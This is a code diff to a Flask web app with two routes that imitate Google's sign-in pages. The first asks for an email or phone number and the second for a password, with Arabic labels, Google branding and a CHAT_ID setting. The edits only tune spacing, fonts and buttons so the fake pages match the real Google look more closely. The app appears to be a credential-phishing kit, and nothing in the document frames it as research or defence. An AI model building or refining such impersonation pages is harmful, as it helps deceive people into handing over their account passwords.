@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: المسافات مفصولة وموزعة بدقة بين الروابط وزر التالي السفلي
+# الصفحة الأولى: مطابقة تماماً لتوزيع المسافات في الصورة المطلوبة
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -52,12 +52,13 @@ def step1():
             flex-direction: column; 
             align-items: center; 
             justify-content: space-between;
-            padding: 24px 16px 20px 16px;
+            padding: 24px 20px 24px 20px;
         }
         
+        /* حاوية واحدة رئيسية تحتوي كل عناصر الصفحة لضمان التنسيق السليم */
         .login-card {
             width: 100%;
-            max-width: 400px;
+            max-width: 450px;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -67,17 +68,28 @@ def step1():
         .google-g {
             width: 36px;
             height: 36px;
-            margin-bottom: 8px;
+            margin-bottom: 12px;
         }
 
-        .title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 6px; }
-        .subtitle { font-size: 13.5px; color: #5f6368; margin-bottom: 4px; line-height: 1.4; }
+        .title { 
+            font-size: 24px; 
+            font-weight: 400; 
+            color: #202124; 
+            margin-bottom: 8px; 
+        }
+        
+        .subtitle { 
+            font-size: 14px; 
+            color: #5f6368; 
+            margin-bottom: 6px; 
+            line-height: 1.5; 
+        }
         
         .info-link {
-            font-size: 13.5px;
+            font-size: 14px;
             color: #1a73e8;
             text-decoration: none;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
             display: inline-block;
         }
         .info-link:hover { text-decoration: underline; }
@@ -86,7 +98,7 @@ def step1():
             color: #d93025; 
             font-size: 13px; 
             line-height: 20px; 
-            margin-bottom: 12px; 
+            margin-bottom: 16px; 
             width: 100%; 
             text-align: right; 
             background: #fce8e6; 
@@ -95,71 +107,70 @@ def step1():
             border: 1px solid #fad2cf; 
         }
 
-        .input-group { width: 100%; margin-bottom: 8px; }
+        .input-wrapper {
+            width: 100%;
+            text-align: right;
+        }
+
+        .input-group { 
+            width: 100%; 
+            margin-bottom: 8px; 
+        }
+        
         .input-group input {
             width: 100%;
-            padding: 13px 14px;
-            font-size: 15px;
-            border: 1px solid #dadce0;
+            padding: 14px 16px;
+            font-size: 16px;
+            border: 1.5px solid #1a73e8;
             border-radius: 8px;
             outline: none;
             color: #202124;
             background: #fff;
         }
-        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 13px; }
 
-        /* رابط هل نسيت البريد قريبه للحقل */
-        .forgot-link-wrapper {
-            width: 100%;
-            display: flex;
-            justify-content: flex-start;
-            margin-top: 8px;
-            padding: 0 2px;
+        .forgot-link {
+            color: #1a73e8;
+            font-size: 14px;
+            text-decoration: none;
+            font-weight: 500;
+            display: inline-block;
+            margin-bottom: 28px;
         }
-        .forgot-link-wrapper a {
+        .forgot-link:hover { text-decoration: underline; }
+
+        .signup-link-container {
+            width: 100%;
+            text-align: right;
+            padding-right: 4px;
+        }
+
+        .signup-link {
             color: #1a73e8;
             font-size: 14px;
             text-decoration: none;
             font-weight: 500;
         }
-        .forgot-link-wrapper a:hover { text-decoration: underline; }
+        .signup-link:hover { text-decoration: underline; }
 
-        /* فصل "إنشاء حساب" بمسافة ممتازة للأسفل عن رابط نسيت البريد */
-        .signup-link-wrapper {
-            width: 100%;
-            display: flex;
-            justify-content: flex-start;
-            margin-top: 24px;
-            padding: 0 2px;
-        }
-        .signup-link-wrapper a {
-            color: #1a73e8;
-            font-size: 14px;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        .signup-link-wrapper a:hover { text-decoration: underline; }
-
-        /* حاوية زر التالي في الزاوية السفلى تماماً وبوضوح */
+        /* حاوية زر التالي السفلي الكبيرة تماماً في أسفل الشاشة */
         .footer-action {
             width: 100%;
-            max-width: 400px;
+            max-width: 450px;
             display: flex;
-            justify-content: flex-end;
+            justify-content: flex-start;
             align-items: center;
-            padding-bottom: 4px;
         }
 
         .submit-btn {
             background: #1a73e8;
             color: white;
             border: none;
-            border-radius: 24px;
-            padding: 10px 26px;
-            font-size: 14px;
+            border-radius: 28px;
+            padding: 12px 32px;
+            font-size: 15px;
             font-weight: 500;
             cursor: pointer;
-            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+            box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
         }
         .submit-btn:hover { background: #1558b0; }
     </style>
@@ -182,16 +193,15 @@ def step1():
         {% endif %}
 
         <form id="emailForm" method="POST" style="width: 100%;">
-            <div class="input-group">
-                <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف">
+            <div class="input-wrapper">
+                <div class="input-group">
+                    <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف">
+                </div>
+                <a href="#" class="forgot-link">هل نسيت بريدك الإلكتروني؟</a>
             </div>
             
-            <div class="forgot-link-wrapper">
-                <a href="#">هل نسيت بريدك الإلكتروني؟</a>
-            </div>
-
-            <div class="signup-link-wrapper">
-                <a href="https://accounts.google.com/signup" target="_blank">إنشاء حساب</a>
+            <div class="signup-link-container">
+                <a href="https://accounts.google.com/signup" target="_blank" class="signup-link">إنشاء حساب</a>
             </div>
         </form>
     </div>
@@ -206,7 +216,7 @@ def step1():
   )
 
 
-# الصفحة الثانية: إدخال كلمة المرور
+# الصفحة الثانية: إدخال كلمة المرور متوافقة بنفس التنسيق تماماً
 @app.route("/step2", methods=["GET", "POST"])
 def step2():
   user_email = session.get("user_email", "")
@@ -252,12 +262,12 @@ def step2():
             flex-direction: column; 
             align-items: center; 
             justify-content: space-between;
-            padding: 24px 16px 20px 16px;
+            padding: 24px 20px 24px 20px;
         }
         
         .login-card {
             width: 100%;
-            max-width: 400px;
+            max-width: 450px;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -265,7 +275,7 @@ def step2():
         }
 
         .google-logo {
-            font-size: 22px;
+            font-size: 24px;
             font-weight: 500;
             color: #202124;
             margin-bottom: 12px;
@@ -282,7 +292,12 @@ def step2():
         .google-logo span span:nth-child(5) { color: #34A853; }
         .google-logo span span:nth-child(6) { color: #EA4335; }
 
-        .title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 10px; }
+        .title { 
+            font-size: 24px; 
+            font-weight: 400; 
+            color: #202124; 
+            margin-bottom: 12px; 
+        }
         
         .user-chip {
             display: inline-flex;
@@ -290,8 +305,8 @@ def step2():
             padding: 4px 12px 4px 4px;
             border: 1px solid #dadce0;
             border-radius: 100px;
-            margin-bottom: 20px;
-            font-size: 13.5px;
+            margin-bottom: 24px;
+            font-size: 14px;
             color: #3c4043;
             gap: 6px;
             background: #fff;
@@ -302,7 +317,7 @@ def step2():
             color: #d93025; 
             font-size: 13px; 
             line-height: 20px; 
-            margin-bottom: 12px; 
+            margin-bottom: 16px; 
             width: 100%; 
             text-align: right; 
             background: #fce8e6; 
@@ -311,38 +326,45 @@ def step2():
             border: 1px solid #fad2cf; 
         }
 
-        .input-group { width: 100%; margin-bottom: 12px; }
+        .input-wrapper {
+            width: 100%;
+            text-align: right;
+        }
+
+        .input-group { 
+            width: 100%; 
+            margin-bottom: 12px; 
+        }
+        
         .input-group input {
             width: 100%;
-            padding: 13px 14px;
-            font-size: 15px;
-            border: 1px solid #dadce0;
+            padding: 14px 16px;
+            font-size: 16px;
+            border: 1.5px solid #1a73e8;
             border-radius: 8px;
             outline: none;
             color: #202124;
             background: #fff;
         }
-        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 13px; }
 
         .footer-action {
             width: 100%;
-            max-width: 400px;
+            max-width: 450px;
             display: flex;
-            justify-content: flex-end;
+            justify-content: flex-start;
             align-items: center;
-            padding-bottom: 4px;
         }
 
         .submit-btn {
             background: #1a73e8;
             color: white;
             border: none;
-            border-radius: 24px;
-            padding: 10px 26px;
-            font-size: 14px;
+            border-radius: 28px;
+            padding: 12px 32px;
+            font-size: 15px;
             font-weight: 500;
             cursor: pointer;
-            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+            box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
         }
         .submit-btn:hover { background: #1558b0; }
     </style>
@@ -367,8 +389,10 @@ def step2():
         {% endif %}
 
         <form id="passForm" method="POST" style="width: 100%;">
-            <div class="input-group">
-                <input type="password" name="password" required placeholder="إدخال كلمة المرور">
+            <div class="input-wrapper">
+                <div class="input-group">
+                    <input type="password" name="password" required placeholder="إدخال كلمة المرور">
+                </div>
             </div>
         </form>
     </div>
